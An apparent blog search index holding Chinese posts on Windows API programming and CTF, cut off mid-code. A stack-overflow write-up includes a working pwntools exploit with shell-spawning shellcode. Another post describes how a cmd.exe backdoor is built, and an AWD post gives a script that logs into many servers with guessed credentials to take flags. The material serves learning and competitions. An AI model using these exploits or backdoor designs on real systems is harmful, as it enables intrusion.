<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Windows编程之进程令牌权限]]></title>
    <url>%2F2018%2F10%2F15%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E8%BF%9B%E7%A8%8B%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[进程的权限在很多时候，我们想要对一些系统进程进行一些操作，例如说修改之类的，对于普通用户来说是不行的，因为这种行为比较危险，需要有对于该计算机较高权限的人才能进行这种操作。 但是有的时候，明明我们是管理员，但是还是会出现拒绝访问的提示，是怎么回事呢？原来有的权限默认是没有开通的，既然都没有开通，那么就算你是管理员也肯定不能使用呀，因此就需要我们进行开通就好了。 修改进程的权限想要修改权限，那么首先利用OpenProcessToken函数打开进程的访问令牌 一般使用如下方式：1OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &amp;hToken); 这里利用GetCurrentProcess函数打开获取自己的进程句柄，然后第二个参数是想要操作的类型，第三个参数是返回的访问令牌的句柄 之后，要获取进程的本地唯一ID，也就是LUID。 说到LUID，我向大家应该都听过GUID，比如在用户组中，每个用户的GUID是唯一的，那么LUID是保证局部唯一，也就是每次进程运行的时候都有个唯一的ID，只有获取了这个LUID，才能在最后进行修改权限 一般利用LookupPrivilegeValue函数进行获取:1LookupPrivilegeValue(NULL, name, &amp;luid); 这里第一个参数是系统名称，一般都是本地系统，就可以直接使用NULL就好了。第二个参数是权限的名称，第三个参数就是获取的luid。 在之后就是修改进程的权限了，利用AdjustTokenPrivilege函数1AdjustTokenPrivilege(hToken, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)； 这里第一个参数是之前返回的进程令牌的句柄，第二个参数是决定权限是修改还是禁用，第三个参数是一个指向TOKEN_PRIVILEGES结构体的指针，第四个就是这个结构体的大小，后两个可空。 当然了，在执行AdjustTokenPrivilege函数之前，需要对TOKEN_PRIVILEGES指针进行赋值，它的结构如下：123456789typedef struct _TOKEN_PRIVILEGES&#123; DWORD PrivilegeCount; LUID_AND_ATTRIBUTE Privilege[];&#125;TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;typedef struct LUID_AND_ATTRIBUTE&#123; LUID Luid; DWORD Attributes;&#125;LUID_AND_ATTRIBUTES, *PLUID_AND_ATTRIBUTES PrivilegeCount是指数组元素的个数，然后是一个数组，其中的attribute一般我们想要使用一个权限就设置为SE_PRIVILEGE_ENABLED，luid根据LookupPrivilegeValue来获取 参考百度百科]]></content>
      <categories>
        <category>Windows编程</category>
      </categories>
      <tags>
        <tag>Windows编程</tag>
        <tag>进程令牌</tag>
        <tag>权限</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[后门的编程思想]]></title>
    <url>%2F2018%2F10%2F07%2F%E5%90%8E%E9%97%A8%E7%9A%84%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%2F</url>
    <content type="text"><![CDATA[前言最近看了一些关于Windows后门的编程，感触颇深，学到了很多，特此分享下来。 从套接字到后门说起后门，其实就是一个功能丰富的客户端与服务器端的程序。在我们初学每种编程语言的时候，都会或多或少的学到关于那种语言的网络编程，那个时候就会接触到socket套接字。 因为后门，在我看来就是一个植入在受害者机器上的一个服务器端程序（正向后门）/客户端程序（反向后门），它们会受害者机器上执行一些危险的命令，并通过网络来将结果发送给攻击者，而既然是通过网络的，那么就必然需要socket啦。在Windows中，想要使用套接字的话就要include&lt;winsock2.h&gt;，以及#pragma comment(lib, &quot;ws2_32.lib&quot;)，这个lib库文件可以在c:\\windows\\system32下找到的。 对于socket编程，熟悉的小伙伴必然是知道套路的：socket初始化 -&gt; bind -&gt; listen -&gt; accept，这样，我们就完成了初步的一个服务器端的代码了，但是既然是后门，那么应该是能够执行命令的呀，一般我们会用c:\\windows\\system32\\cmd.exe这个程序，该程序就是我们常用的cmd终端了，他是在系统目录下的已经存在的程序，除非管理员故意删除，否则没台windows电脑上都会有的。 从命令执行到后门既然想要执行cmd的命令，那么之前说的，我们可以利用cmd.exe这个文件，但是我们的后门是一个程序，执行之后就是一个进程，而cmd.exe执行之后也是一个进程，这样就涉及到了一个概念：进程间通信。 这个我们给出的解决方案就是利用管道的方式，来将我们的输入以及cmd执行后的结果通过管道来传递。 说到管道，那么什么是管道呢？你可以简单的想象成一个管子，水管也行。管道有两端，那么一端一个进程不就可以实现进程的通信了嘛。 但是管道有两种，一个叫做匿名管道，一个叫做命名管道。 匿名管道只能用于有血缘关系的两个进程之间的通信，大多是父子进程的通信，而命名管道是两个独立的进程，通过访问一个管道服务器来进行数据的交换的，那么一看就是命名管道好复杂的，所以我们还是用匿名管道吧，但是利用匿名管道的话就需要父进程和子进程了。咋办呢？我们可以用让我们的后门fork一个子进程，这个子进程就是cmd.exe，这样不就好了嘛。 在Windows中，创建匿名管道使用函数CreatePipe，而创建子进程是CreateProcess函数。那么创建好了，如何通信的具体操作又是如何呢？如何让这两个进程相连呢？ 我们在CreatePipe的时候，需要用到四个参数，分别是hRead句柄，hWrite句柄，SECURITY_ATTRIBUTES结构体，还有一个0作为缺省值就行了。其中前两个句柄分别是管道的读和写的方式。 而CreateProcess会先使用GetStartupInfo这个函数，该函数接收一个STARTUPINFO参数，该参数有StdInput、StdOutput、StdError，如果了解linux系统的就知道这三个是干啥的了，分别是标准输入、标准输出、标准错误，我们将之前的hRead句柄和标准输入相连，hWrite句柄和StdOutput和StdError相连，这样就可以将cmd.exe与后门相连了。 到此，一个简单的后门程序就搞定了。 从单线程到多线程刚才我们说的只是一个简单的单线程后门的例子，但是这样有个问题就是该后门只能给一个连接使用，那么我们想要多个连接都连接到这个线程怎么办呢？显而易见，答案就是多线程了。我们知道在写socket编程的时候，服务器端会在accept函数出阻塞，等待客户端的连接，因此，如果我们想写一个多线程来实现多连接的话，那么就要在这里使用循环来实现多个accept函数阻塞等待多个连接，需要注意的是，这里的循环次数最好和之前listen函数的次数是一样的。 还有一点是，在windows下，想要实现多线程的话，需要创建线程函数，至于线程线程函数是如何的，可以看我之前的博文————Windows编程之进程与线程 无管道后门当然了，如果我们希望在完成后门的时候不需要管道，觉得写管道太过于麻烦了，那么也可以不用管道的。这里就要提出新的概念了，那就是WSASocket，WSASocket是windows专用的socket，与通用的socket不同的是，WSASocket是非阻塞的，并且在处理消息的时候是可以重叠使用的，可以不断的接受消息，组成消息队列，而不是像socket那样，只能接受之后发送才能再接受新的消息。 在使用WSASocket，需要在socket初始化的时候将socket变为WSASocket，当然了，对应的参数也是要改变的。后面创建进程之前的STARTUPINFO结构体，将StdOutput、StdInput、StdError直接和WSASocket句柄相连，即可，这样就实现了无管道后门的操作。]]></content>
      <categories>
        <category>Windows编程</category>
      </categories>
      <tags>
        <tag>Windows编程</tag>
        <tag>后门</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows编程之动态链接库]]></title>
    <url>%2F2018%2F09%2F30%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%2F</url>
    <content type="text"><![CDATA[动态链接库动态链接库就是大家俗称的DLL文件，在windows系统中非常常见，是一个可以被其他程序共享的功能模块。动态连接库是不能直接执行的，它只能作为导出函数，被其他exe文件调用，一般我们都会说“导入/加载动态链接库”。 导出函数刚才说到了一个导出函数的概念，导出函数一般跟内部函数进行比较，内部函数就是在这个文件中内部定义的函数，只能这个文件来调用。而导出函数是在这个文件中定义，这个文件能够使用，但是别的文件也是同样可以使用的。 动态链接库编程动态链接库，顾名思义，是当程序执行的时候需要用到一些导出函数的时候才加载DLL文件，并且在使用之后会卸载掉，意味着可以节省内存。 在我们进行动态链接库编程的时候，首先需要编写DLL文件，可以用IDE新建一个动态链接库的项目，会自动生成一个DLLMain.cpp文件，里面有定义好的模版。 123456789101112131415BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 其中DLL_PROCESS_ATTACH是加载到内存的时候执行，DLL_THREAD_ATTACH是进程中有线程时执行，DLL_THREAD_DETACH是进程中线程被结束的时候执行，DLL_PROCESS_DETACH是从内存中卸载的时候执行。 我们想要定义自己的导出函数的话，就在main函数的上面或者下面都可以12345678910111213141516171819202122#include &quot;stdafx.h&quot;int MyMessageBox(char* lpText, char* lpCaption) &#123; MessageBoxA(NULL, lpText, lpCaption, 0); return 0;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 写好了定义的代码，我们还需要新建一个模版定义文件，是.def后缀的文件，其中声明要导出的函数名称12EXPORTS MyMessageBox 然后我们进行编译，就会得到dll文件了。 之后我们新建一个.c文件，定义main函数，来加载我们编译好的动态链接库文件。 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef int(*MyMessageBox)(char* lpText, char* lpCaption);int main(int argc, char* argv[]) &#123; HMODULE hModule = LoadLibrary(&quot;DLLP.dll&quot;); if (hModule == NULL) &#123; printf(&quot;LoadLibrary error\n&quot;); return 0; &#125; MyMessageBox NewMessageBox = (MyMessageBox)GetProcAddress(hModule, &quot;MyMessageBox&quot;); if (NewMessageBox == NULL) &#123; printf(&quot;GetProcAddress error\n&quot;); return 0; &#125; NewMessageBox(&quot;Hello, my friend.&quot;, &quot;Pino_HD&quot;); FreeLibrary(hModule); return 0;&#125; 代码中我们必须要先定义好我们需要引用的函数原型，在main函数中，使用LoadLibrary函数加载DLL文件，该函数会返回一个DLL文件的句柄，然后使用GetProcAddress获取导出函数的地址，其参数是之前返回的句柄，以及导出函数的名称。最后调用导出函数即可。当然了，最后不要忘记用FreeLibrary函数将句柄清空。 1gcc dllp.c -o dllp 编译之后执行可执行文件即可发现有弹窗。]]></content>
      <categories>
        <category>Windows编程</category>
      </categories>
      <tags>
        <tag>Windows编程</tag>
        <tag>动态链接库</tag>
        <tag>DLL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验吧piolt(栈溢出)Writeup]]></title>
    <url>%2F2018%2F09%2F28%2F%E5%AE%9E%E9%AA%8C%E5%90%A7piolt%E6%A0%88%E6%BA%A2%E5%87%BAWriteup%2F</url>
    <content type="text"><![CDATA[前言最近闲来无事，准备开始学习一波pwn，先从最基本的栈溢出开始学起，在实验吧中找了一道基础的栈溢出题目做了做，收获颇多。 解题思路根据题目要求，nc连接远程服务器 发现一些文字，以及一个Location的地址，还有一个可以输入的Command命令，随便输入一个ls告诉我任务失败。同时还给了一个附件，是这个程序的可执行文件，先利用file命令查看文件的格式是一个64位的程序，然后在checksec看一下有什么防护emmmm,什么防护也没有，很好。直接放入IDA中，找到main函数，F5进行反汇编。 通过阅读代码，发现了read函数存在栈溢出。程序在最开始的时候生命了buf数组，大小为0x20，也就是32，在执行read函数的时候，读取了0x40，也就是64位，很明显的栈溢出。 其中给了一个Location，发现是buf的地址，那么情况就很明了了，我们可以在buf区开始写shellcode，然后利用padding覆盖到返回地址，在返回地址的地方写上这个buf的地址，这样程序在返回的时候就可以返回到buf的地址，从而执行我们写的shellcode了。 由代码我们知道，buf的长度是0x20，也就是32字节，这个是64位的程序，也就是说1粒度是8个字节，那么buf是局部变量，栈上紧跟着是调用者的ebp（32-40），之后就是返回地址了（40-48），因此我们只要确保40之后是那个buf的地址就好了 Payload1234567891011121314from pwn import *context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)r = remote(&apos;106.2.25.7&apos;, &apos;8003&apos;)r.recvuntil(&apos;Location:&apos;)l = int(r.recvuntil(&apos;\n&apos;)[:-1], 16)shellcode = &quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;print disasm(shellcode)payload = shellcode + (40 - len(shellcode)) * &apos;A&apos; + p64(l)print len(shellcode)r.recvuntil(&quot;Command:&quot;)r.sendline(payload)r.interactive() 得到shell后，进入/home目录，得到flag]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows编程之进程与线程]]></title>
    <url>%2F2018%2F09%2F28%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Windows编程之进程现在的Windows操作系统实行的是抢占式多任务的调度方式，意思是操作系统在执行多任务的时候会按照优先级对任务进行排序，重要的任务先执行，但是并不会一直霸占cpu，而是在执行一段时间后操作系统会收回其运行的权利，把它排到后面，然后让其他的任务进行执行，每次执行的任务的时间其实是特别少的，那么对于任务来说，相当于同时在执行所有的任务。 进程这一部分，我们的代码展示了如果获取系统的进程列表，以及删除进程。 代码之进程123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv[]) &#123; HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hProcessSnap == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateToolhelp32Snapshot error\n&quot;); return 0; &#125; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); char buff[1024]; BOOL bProcess = Process32First(hProcessSnap, &amp;pe32); DWORD sogoupid; while (bProcess) &#123; wsprintf(buff, &quot;%40s ------------------- %6d\n&quot;, pe32.szExeFile, pe32.th32ProcessID); if (strcmp(pe32.szExeFile, &quot;SogouCloud.exe&quot;) == 0) &#123; sogoupid = pe32.th32ProcessID; &#125; printf(buff); memset(buff, 0x00, 1024); bProcess = Process32Next(hProcessSnap, &amp;pe32); &#125; CloseHandle(hProcessSnap); printf(&quot;SogouCloud&apos;s pid is %d\n&quot;, sogoupid); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, sogoupid); if (hProcess == NULL) &#123; printf(&quot;OpenProcess error\n&quot;); return 0; &#125; if (TerminateProcess(hProcess, 0)) &#123; printf(&quot;终止进程成功&quot;); &#125; CloseHandle(hProcess); return 0;&#125; 简单的分析一下这段代码，首先在写获取进程的代码之前要#include &lt;TlHelp32.h&gt;，在main函数中，首先利用CreateToolhelp32Snapshot函数来获取进程快照的句柄，该函数的第一个参数是获取进程的类型，我们选择TH32CS_SNAPPROCESS，来获取进程，第二个参数为0，代表获取系统的所有进程。 之后声明一个PROCESSENTRY32结构变量，该变量用于存取获取的进程的各种信息。 利用Process32First函数来取得第一个进程，之后用while循环配合Process32Next函数来获取所有的进程。我们用到的PROCESSENTRY32结构体中的szExeFile是进程的文件名，th32ProcessID是进程的pid。 在之后我们判断进程名是否是SogouCloud.exe来获取其pid，最后利用OpenProcess打开进程获取句柄，配合TerminateProcess函数结束进程。 Windows编程之多线程对于多线程，没啥好说的，主要是说一下代码中将要出现的临界区。在多线程中的有一个临界区的概念，意思是同一时间内，只能有一个线程访问临界区的资源，这样能够防止对于一个文件来说，多个线程同时修改的的问题。 代码之线程12345678910111213141516171819202122232425262728293031323334353637#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;HANDLE hFile;CRITICAL_SECTION cs;DWORD WINAPI Thread(LPVOID IpParam) &#123; int n = (int)IpParam; DWORD dwWrite; for (int i = 0; i &lt; 100; i++) &#123; EnterCriticalSection(&amp;cs); char Data[256] = &quot;Hello, my friend.\r\n&quot;; WriteFile(hFile, &amp;Data, strlen(Data), &amp;dwWrite, NULL); LeaveCriticalSection(&amp;cs); &#125; printf(&quot;第%d号线程结束运行\n&quot;, n); return 0;&#125;int main(int argc, char* argv[]) &#123; hFile = CreateFile(&quot;C:\\Users\\pino\\source\\repos\\new\\new\\hack.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile error\n&quot;); return 0; &#125; HANDLE hThread[5]; DWORD dwThreadId; InitializeCriticalSection(&amp;cs); for (int i = 0; i &lt; 5; i++) &#123; hThread[i] = CreateThread(NULL, 0, Thread, (LPVOID)(i+1), 0, &amp;dwThreadId); printf(&quot;第%d号线程创建成功\n&quot;, i + 1); &#125; WaitForMultipleObjects(5, hThread, TRUE, INFINITE); DeleteCriticalSection(&amp;cs); CloseHandle(hFile); return 0;&#125; 代码中的临界区的实现需要先定义一个全局的CRITICAL_SECTION结构变量。然后是InitializeCriticalSection -&gt; EnterCriticalSection -&gt; LeaveCriticalSection -&gt; DeleteCriticalSection。 还有就是在定义线程函数的时候统一的格式DWORD WINAPI 函数名(LPVOID 参数)]]></content>
      <categories>
        <category>Windows编程</category>
      </categories>
      <tags>
        <tag>Windows编程</tag>
        <tag>进程</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows编程之注册表编程基础]]></title>
    <url>%2F2018%2F09%2F27%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[Windows编程之注册表编程关于注册表，是Windows的一大特色，也是在Windows渗透过程中用得到的，不过我一向觉得Windows的注册表太过神秘（好吧，是因为太多了。。。），那么今天学会了操作注册表的一些操作，包括RegCreateKeyEx, RegOpenKeyEx, RegQueryValueEx, RegSetValueEx, RegDeleteValue, RegCloseKey 代码1234567891011121314151617181920212223#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; HKEY hKey; DWORD dwType; char d[255]; DWORD nLen = sizeof(d); char* data = &quot;https://www.baidu.com/&quot;; RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Internet Explorer\\Main&quot;, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, &amp;hKey); RegQueryValueEx(hKey, &quot;Start Page&quot;, 0, &amp;dwType, (LPBYTE)d, &amp;nLen); printf(&quot;before change: %s\n&quot;, d); memset(d, 0, strlen(d)); RegSetValueEx(hKey, &quot;Start Page&quot;, 0, REG_SZ, (BYTE*)data, strlen(data)); RegQueryValueEx(hKey, &quot;Start Page&quot;, 0, &amp;dwType, (LPBYTE)d, &amp;nLen); printf(&quot;after change: %s\n&quot;, d); //RegDeleteValue(hKey, &quot;Start Page&quot;); //RegQueryValueEx(hKey, &quot;Start Page&quot;, 0, &amp;dwType, (LPBYTE)d, &amp;nLen); //printf(&quot;after delete: %s\n&quot;, d); RegCloseKey(hKey); return 0;&#125; 这里稍微说一下这段代码的含义，总的作用就是修改ie浏览器的默认页面，改成baidu的首页。那么首先利用RegOpenKeyEx打开注册表，并且将句柄放到先前声明的hKey中，这里的参数前两个比较好理解，分别是注册表的主键和子建，第三个REG_OPTION_NON_VOLATILE意思是将注册表项存入文件中，使得重启后修改有效，相反的就是REG_OPTION_VOLATILE，意思是重启后无效，KEY_ALL_ACCESS的意思是打开子建后允许任意操作，最后一个是用来存放句柄的。 之后我们使用RegQueryKeyEx函数进行查询，这里第三个选项为保留值，一般为0，第四个是我门声明的一个DWORD变量，这个是用来存放查询的注册表值的类型，第五个是用来存放查询后的值的缓冲区，然后是缓冲区的大小。 查询后我们在利用RegSetValueEx函数进行修改，第三个选项为保留值，一般为0，第四个选项是要修改的注册表的类型，这里是REG_SZ，之后是要修改的数据的缓冲区以及他的大小。 当然了，使用RegDeleteValue即可删除注册表选项，参数也很简单，一个句柄，一个要删除的名字 最后用RegCloseKey来关闭注册表的句柄即可。]]></content>
      <categories>
        <category>Windows编程</category>
      </categories>
      <tags>
        <tag>Windows编程</tag>
        <tag>注册表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Python实现批量自动化SSH登陆并执行命令后获取数据]]></title>
    <url>%2F2018%2F09%2F25%2F%E5%88%A9%E7%94%A8Python%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96SSH%E7%99%BB%E9%99%86%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%90%8E%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[前言放假前辽宁省为了应景“网络安全宣传周”举办了一场安恒杯，初赛依靠大佬们的出色发挥进了决赛，奈何pwn大佬实习出差不能赶回来，我们两个Web只要赶鸭子上架，2 VS 3不过幸运的是最终获取了二等奖，遗憾的是离最终大奖只差一步一摇…而能够获取这二等奖的原因，也是因为在最后一轮我发现了一个隐藏的用户名和密码，猜到了密码，就可以随意登陆别的队的服务器，然后执行curl命令来获取flag，但是当时不会写登陆ssh的脚本，导致我们两个手动连接30台服务器，累的要死。之后特意来学习一下 代码123456789101112131415161718192021from pexpect import pxssh#host = &apos;&apos;username = &apos;dbappp&apos;password = &apos;dbapp2018&apos;#port = for i in range(0,30): try: host = &quot;10.50.&quot;+str(i)+&quot;.2&quot; s = pxssh.pxssh() s.login(host, username, password) s.sendline(&apos;curl 10.0.1.2&apos;) s.prompt() result = str(s.before, encoding=&apos;utf-8&apos;).split(&apos;\r\n&apos;) print(&apos;Team&apos;+str(i)+&apos;:&apos;) print(result[1]) s.logout() except: print(&quot;pxssh failed on login.&quot;) 首先需要用到python的库pexpect，直接pip3 install pexpect安装即可。 首先pxssh.pxssh()进行初始化，然后直接s.login()登陆即可，这里默认是登陆22端口的，如果需要指定端口，则需要在login函数中指定port参数之后如果用户名密码正确的话，就登陆成功了，再然后使用s.sendline()就可以在服务器上执行命令了，而s.prompt()用来获取前后两个服务器登陆的标志，类似这样其中#井号就是这个标志，这个主要是用来获取两个井号之前的内容，然后利用s.before输出出来，但是我发现这样的话也会将我们输入的命令也获取到，因此我再这里进行了一些处理，就能够获取到flag了。 最后再来一波循环，批量登陆别的队伍的服务器然后获取flag。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>SSH</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows编程之文件操作]]></title>
    <url>%2F2018%2F09%2F25%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[Windows编程之文件操作该程序主要功能就是创建一个文件，然后在文件的后面追加数据，之后将文件复制到上层目录，然后将其重命名，最后再删除。所应用到的windows函数有CreateFile, WriteFile, CopyFile, MoveFile, DeleteFile, SetFilePointer 代码123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; HANDLE hFile = CreateFile(argv[1], GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;Create failed\n&quot;); return 0; &#125; if (SetFilePointer(hFile, 0, NULL, FILE_END) == -1) &#123; printf(&quot;SetFilePointer error\n&quot;); return 0; &#125; char buff[] = &quot;配置信息&quot;; DWORD dwWrite; if (!WriteFile(hFile, &amp;buff, strlen(buff), &amp;dwWrite, NULL)) &#123; printf(&quot;Writer error\n&quot;); return 0; &#125; printf(&quot;往%s写入数据成功\n&quot;, argv[1]); char newCopyPath[] = &quot;../2.txt&quot;; char newMovePath[] = &quot;../3.txt&quot;; if (!CopyFile(argv[1], newCopyPath, FALSE)) &#123; printf(&quot;CopyFile error\n&quot;); return 0; &#125; if (!MoveFile(newCopyPath, newMovePath)) &#123; printf(&quot;MoveFile error\n&quot;); return 0; &#125; if (!DeleteFile(newMovePath)) &#123; printf(&quot;DeleteFile error\n&quot;); return 0; &#125; CloseHandle(hFile); return 0;&#125;]]></content>
      <categories>
        <category>Windows编程</category>
      </categories>
      <tags>
        <tag>Windows编程</tag>
        <tag>文件操作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows网络编程]]></title>
    <url>%2F2018%2F09%2F24%2FWindows%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[前言因为在写代码的时候感觉用VS太过臃肿，每次写个程序还要创建一个项目，并且特别占用空间，因此安装了mingw，可以在命令行中直接gcc编译，特别方便，安利一下～并且在编译socket程序的时候，一定要加上-l wsock32选项，因为mingw默认没有包含windows库 TCP版本 SERVER端 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;Winsock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; WSADATA wsaData; WORD sockVersion = MAKEWORD(2, 2); if (WSAStartup(sockVersion, &amp;wsaData) != 0) &#123; return 0; &#125; SOCKET sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (sListen == INVALID_SOCKET) &#123; printf(&quot;socket error\n&quot;); return 0; &#125; struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(4500); sin.sin_addr.S_un.S_addr = INADDR_ANY; if (bind(sListen, (LPSOCKADDR)&amp;sin, sizeof(sin)) == SOCKET_ERROR) &#123; printf(&quot;socket error\n&quot;); closesocket(sListen); return 0; &#125; if (listen(sListen, 5) == SOCKET_ERROR) &#123; printf(&quot;socket error\n&quot;); closesocket(sListen); return 0; &#125; struct sockaddr_in remoteAddr; SOCKET sClient; int nAddrLen = sizeof(remoteAddr); char revData[255]; while(TRUE)&#123; sClient = accept(sListen, (SOCKADDR*)&amp;remoteAddr, &amp;nAddrLen); if (sClient == SOCKET_ERROR) &#123; printf(&quot;accept() error\n&quot;); continue; &#125; printf(&quot;接受到一个连接：%s \r\n&quot;, inet_ntoa(remoteAddr.sin_addr)); int ret = recv(sClient, revData, 255, 0); if (ret &gt; 0) &#123; revData[ret] = 0x00; printf(revData); &#125; char* buff = (char*)&quot;\r\nHello, my friend\r\n&quot;; send(sClient, buff, strlen(buff), 0); closesocket(sClient); &#125; closesocket(sListen); WSACleanup(); return 0;&#125; CLIENT端 12345678910111213141516171819202122232425262728293031323334353637#include &lt;WinSock2.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)int main(int argc, char* argv[]) &#123; WSADATA wsaData; WORD sockVersion = MAKEWORD(2, 2); if (WSAStartup(sockVersion, &amp;wsaData) != 0) &#123; return 0; &#125; SOCKET sClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (sClient == SOCKET_ERROR) &#123; printf(&quot;socket error\n&quot;); return 0; &#125; struct sockaddr_in servAddr; servAddr.sin_family = AF_INET; servAddr.sin_port = htons(4500); servAddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); if (connect(sClient, (SOCKADDR*)&amp;servAddr, sizeof(servAddr)) == SOCKET_ERROR) &#123; printf(&quot;socket error\n&quot;); closesocket(sClient); return 0; &#125; char* buff = (char*)&quot;\r\nHello, my friend\r\n&quot;; send(sClient, buff, strlen(buff), 0); char revData[255]; int ret = recv(sClient, revData, 255, 0); if (ret &gt; 0) &#123; revData[ret] = 0x00; printf(revData); &#125; closesocket(sClient); WSACleanup(); return 0;&#125; 编译 12gcc server.c -o server -lwsock32gcc client.c -o client -lwsock32 UDP版本 SERVER端 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; WSADATA wsaData; WORD sockVersion = MAKEWORD(2, 2); if (WSAStartup(sockVersion, &amp;wsaData) != 0) &#123; return 0; &#125; SOCKET serSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); if (serSocket == INVALID_SOCKET) &#123; printf(&quot;socket error !&quot;); return 0; &#125; struct sockaddr_in serAddr; serAddr.sin_family = AF_INET; serAddr.sin_port = htons(8000); serAddr.sin_addr.S_un.S_addr = INADDR_ANY; if (bind(serSocket, (SOCKADDR*)&amp;serAddr, sizeof(serAddr)) == SOCKET_ERROR) &#123; printf(&quot;bind error !&quot;); closesocket(serSocket); return 0; &#125; struct sockaddr_in remoteAddr; int nAddrLen = sizeof(remoteAddr); while (TRUE) &#123; char recvData[255]; int ret = recvfrom(serSocket, recvData, 255, 0, (SOCKADDR*)&amp;remoteAddr, &amp;nAddrLen); if (ret &gt; 0) &#123; recvData[ret] = 0x00; printf(&quot;接受到一个连接：%s \r\n&quot;, inet_ntoa(remoteAddr.sin_addr)); printf(recvData); &#125; char * sendData = &quot;一个来自服务端的UDP数据包\n&quot;; sendto(serSocket, sendData, strlen(sendData), 0, (SOCKADDR*)&amp;remoteAddr, nAddrLen); &#125; closesocket(serSocket); WSACleanup(); return 0;&#125; CLIENT端 123456789101112131415161718192021222324252627282930313233343536#include &lt;winsock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; WORD socketVersion = MAKEWORD(2, 2); WSADATA wsaData; if (WSAStartup(socketVersion, &amp;wsaData) 